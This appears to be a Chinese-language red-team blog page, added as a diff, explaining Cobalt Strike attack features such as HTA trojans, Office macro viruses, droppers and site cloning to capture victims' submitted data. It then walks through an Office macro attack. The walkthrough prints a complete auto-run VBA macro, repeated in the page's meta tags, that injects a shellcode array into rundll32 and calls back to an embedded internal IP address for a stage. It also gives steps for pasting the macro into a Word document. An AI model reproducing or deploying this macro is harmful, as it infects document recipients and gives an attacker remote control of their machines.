@@ -1,0 +1,398 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <title>CS基础和WEB Drive-by功能详解 // Y4ph3tS blog</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.139.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Y4ph3tS" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CS基础和WEB Drive-by功能详解">
+  <meta name="twitter:description" content="CS基础 CS服务端启动方式
+./teamserver ip password Attacks-Packages:
+HTML Application生成恶意HTA木马
+MS Office Macro生成office宏病毒
+Payload Generator生成各种语言版本的payload
+USB/CD Autoplay 生成利用自动播放运行的木马
+Windows Dropper捆绑器，对文档类进行捆绑
+Windows Executable 生成可执行exe木马
+Windows Executable(S)生成无状态的exe木马
+Attacks-Web Drive-by
+Manage对开启的web服务进行管理
+Clone Site克隆网站，可记录受害者提交数据
+Host File 提供文件下载，可修改Mime信息
+Powershell Web Delivery类似MSF的WEB_delivery
+signed applet attack 使用java自签名程序进行钓鱼
+Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本
+System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等
+生成对应木马目标执行后就会上线
+可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动
+CS使用office宏进行攻击 新建一个office监听器
+点击生成宏后选择监听器
+宏代码会自动加载，需要自己点击复制然后创建宏
+默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉
+Private Type PROCESS_INFORMATIONhProcess As LonghThread As LongdwProcessId As LongdwThreadId As LongEnd TypePrivate Type STARTUPINFOcb As LonglpReserved As StringlpDesktop As StringlpTitle As StringdwX As LongdwY As LongdwXSize As LongdwYSize As LongdwXCountChars As LongdwYCountChars As LongdwFillAttribute As LongdwFlags As LongwShowWindow As IntegercbReserved2 As IntegerlpReserved2 As LonghStdInput As LonghStdOutput As LonghStdError As LongEnd Type#If VBA7 ThenPrivate Declare PtrSafe Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtrPrivate Declare PtrSafe Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtrPrivate Declare PtrSafe Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#ElsePrivate Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPrivate Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPrivate Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As LongPrivate Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open()Dim myByte As Long, myArray As Variant, offset As LongDim pInfo As PROCESS_INFORMATIONDim sInfo As STARTUPINFODim sNull As StringDim sProc As String#If VBA7 ThenDim rwxpage As LongPtr, res As LongPtr#ElseDim rwxpage As Long, res As Long#End IfmyArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _49,55,50,46,49,54,46,49,50,46,49,50,57,0)If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 ThensProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;ElsesProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;End Ifres = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)For offset = LBound(myArray) To UBound(myArray)myByte = myArray(offset)res = WriteStuff(pInfo.hProcess, rwxpage &#43; offset, myByte, 1, ByVal 0&amp;)Next offsetres = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 将这串代码复制到WORD或者其他office中进行创建宏">
+
+    <meta property="og:url" content="https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/">
+  <meta property="og:site_name" content="Y4ph3tS blog">
+  <meta property="og:title" content="CS基础和WEB Drive-by功能详解">
+  <meta property="og:description" content="CS基础 CS服务端启动方式
+./teamserver ip password Attacks-Packages:
+HTML Application生成恶意HTA木马
+MS Office Macro生成office宏病毒
+Payload Generator生成各种语言版本的payload
+USB/CD Autoplay 生成利用自动播放运行的木马
+Windows Dropper捆绑器，对文档类进行捆绑
+Windows Executable 生成可执行exe木马
+Windows Executable(S)生成无状态的exe木马
+Attacks-Web Drive-by
+Manage对开启的web服务进行管理
+Clone Site克隆网站，可记录受害者提交数据
+Host File 提供文件下载，可修改Mime信息
+Powershell Web Delivery类似MSF的WEB_delivery
+signed applet attack 使用java自签名程序进行钓鱼
+Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本
+System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等
+生成对应木马目标执行后就会上线
+可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动
+CS使用office宏进行攻击 新建一个office监听器
+点击生成宏后选择监听器
+宏代码会自动加载，需要自己点击复制然后创建宏
+默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉
+Private Type PROCESS_INFORMATIONhProcess As LonghThread As LongdwProcessId As LongdwThreadId As LongEnd TypePrivate Type STARTUPINFOcb As LonglpReserved As StringlpDesktop As StringlpTitle As StringdwX As LongdwY As LongdwXSize As LongdwYSize As LongdwXCountChars As LongdwYCountChars As LongdwFillAttribute As LongdwFlags As LongwShowWindow As IntegercbReserved2 As IntegerlpReserved2 As LonghStdInput As LonghStdOutput As LonghStdError As LongEnd Type#If VBA7 ThenPrivate Declare PtrSafe Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtrPrivate Declare PtrSafe Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtrPrivate Declare PtrSafe Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#ElsePrivate Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPrivate Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPrivate Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As LongPrivate Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open()Dim myByte As Long, myArray As Variant, offset As LongDim pInfo As PROCESS_INFORMATIONDim sInfo As STARTUPINFODim sNull As StringDim sProc As String#If VBA7 ThenDim rwxpage As LongPtr, res As LongPtr#ElseDim rwxpage As Long, res As Long#End IfmyArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _49,55,50,46,49,54,46,49,50,46,49,50,57,0)If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 ThensProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;ElsesProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;End Ifres = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)For offset = LBound(myArray) To UBound(myArray)myByte = myArray(offset)res = WriteStuff(pInfo.hProcess, rwxpage &#43; offset, myByte, 1, ByVal 0&amp;)Next offsetres = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 将这串代码复制到WORD或者其他office中进行创建宏">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2018-04-02T02:13:01+08:00">
+    <meta property="article:modified_time" content="2018-04-02T02:13:01+08:00">
+    <meta property="article:tag" content="红队技术">
+    <meta property="article:tag" content="CobaltStrike">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://yaphetszz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <span class="app-header-title">Y4ph3tS blog</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">主页</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/categories/">分类</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">标签</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">关于</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/links/">友链</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/atta/">附件</a>
+      </nav>
+      <p>Valar Morghulis</p>
+      <div class="app-header-social">
+        
+          <a href="https://yaphetszz.github.com" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">CS基础和WEB Drive-by功能详解</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Apr 2, 2018
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          
+          11107 Words - 
+          
+          22 min read
+        </div>
+          <p>创建时间: 2018-04-02 02:13</p>
+        
+           
+          
+          <p>最后修改时间: 2020-07-21 14:33</p>
+          
+        
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/cobaltstrike/">CobaltStrike</a>
+        </div>
+        <div>
+          <p></p>
+          <p>文章分类:    </p>
+              <a class="tag" href="https://yaphetszz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="cs基础">CS基础</h2>
+<p>CS服务端启动方式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>./teamserver ip password
+</span></span></code></pre></div><p>Attacks-Packages:</p>
+<p>HTML Application生成恶意HTA木马</p>
+<p>MS Office Macro生成office宏病毒</p>
+<p>Payload Generator生成各种语言版本的payload</p>
+<p>USB/CD Autoplay 生成利用自动播放运行的木马</p>
+<p>Windows Dropper捆绑器，对文档类进行捆绑</p>
+<p>Windows Executable 生成可执行exe木马</p>
+<p>Windows Executable(S)生成无状态的exe木马</p>
+<p>Attacks-Web Drive-by</p>
+<p>Manage对开启的web服务进行管理</p>
+<p>Clone Site克隆网站，可记录受害者提交数据</p>
+<p>Host File 提供文件下载，可修改Mime信息</p>
+<p>Powershell Web Delivery类似MSF的WEB_delivery</p>
+<p>signed applet attack 使用java自签名程序进行钓鱼</p>
+<p>Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本</p>
+<p>System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等</p>
+<p>生成对应木马目标执行后就会上线</p>
+<p><img src="../index_files/2fdf5b6a-65b6-4888-9e9b-70f624fefead.png" alt="img"></p>
+<p>可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动</p>
+<h2 id="cs使用office宏进行攻击">CS使用office宏进行攻击</h2>
+<p>新建一个office监听器</p>
+<p><img src="../index_files/63c98e4d-e674-4a25-a25e-2876033e8076.png" alt="img"></p>
+<p>点击生成宏后选择监听器</p>
+<p><img src="../index_files/3f82cbe3-a538-43c0-ac0a-8c0b74806e3a.png" alt="img"></p>
+<p>宏代码会自动加载，需要自己点击复制然后创建宏</p>
+<p><img src="../index_files/f89def44-eefc-43c7-9dac-f3b8ffaba382.png" alt="img"></p>
+<p>默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉</p>
+<pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">Private Type PROCESS_INFORMATION
+    hProcess As Long
+    hThread As Long
+    dwProcessId As Long
+    dwThreadId As Long
+End Type
+Private Type STARTUPINFO
+    cb As Long
+    lpReserved As String
+    lpDesktop As String
+    lpTitle As String
+    dwX As Long
+    dwY As Long
+    dwXSize As Long
+    dwYSize As Long
+    dwXCountChars As Long
+    dwYCountChars As Long
+    dwFillAttribute As Long
+    dwFlags As Long
+    wShowWindow As Integer
+    cbReserved2 As Integer
+    lpReserved2 As Long
+    hStdInput As Long
+    hStdOutput As Long
+    hStdError As Long
+End Type
+#If VBA7 Then
+    Private Declare PtrSafe Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr
+    Private Declare PtrSafe Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr
+    Private Declare PtrSafe Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#Else
+    Private Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
+    Private Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+    Private Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long
+    Private Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
+#End If
+Sub Auto_Open()
+    Dim myByte As Long, myArray As Variant, offset As Long
+    Dim pInfo As PROCESS_INFORMATION
+    Dim sInfo As STARTUPINFO
+    Dim sNull As String
+    Dim sProc As String
+#If VBA7 Then
+    Dim rwxpage As LongPtr, res As LongPtr
+#Else
+    Dim rwxpage As Long, res As Long
+#End If
+    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _
+60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _
+80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _
+125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _
+91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _
+-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _
+83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _
+47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _
+88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _
+88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _
+104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _
+-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _
+-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _
+11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _
+-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _
+0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _
+49,55,50,46,49,54,46,49,50,46,49,50,57,0)
+    If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 Then
+        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;
+    Else
+        sProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;
+    End If
+    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)
+    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)
+    For offset = LBound(myArray) To UBound(myArray)
+        myByte = myArray(offset)
+        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)
+    Next offset
+    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+Sub Workbook_Open()
+    Auto_Open
+End Sub
+</code></pre><p>将这串代码复制到WORD或者其他office中进行创建宏</p>
+<p>office2016版本的位置如下：视图-宏-创建宏</p>
+<p>建议宏位置直接选择当前文档，要不然可能会返回多个shell</p>
+<p><img src="../index_files/bd8d9d73-5bef-44d7-b63d-f39bdc75f55b.png" alt="img"></p>
+<p>然后将宏代码插入</p>
+<p><img src="../index_files/148d9b2d-aea5-4eea-b21b-a768049468f7.png" alt="img"></p>
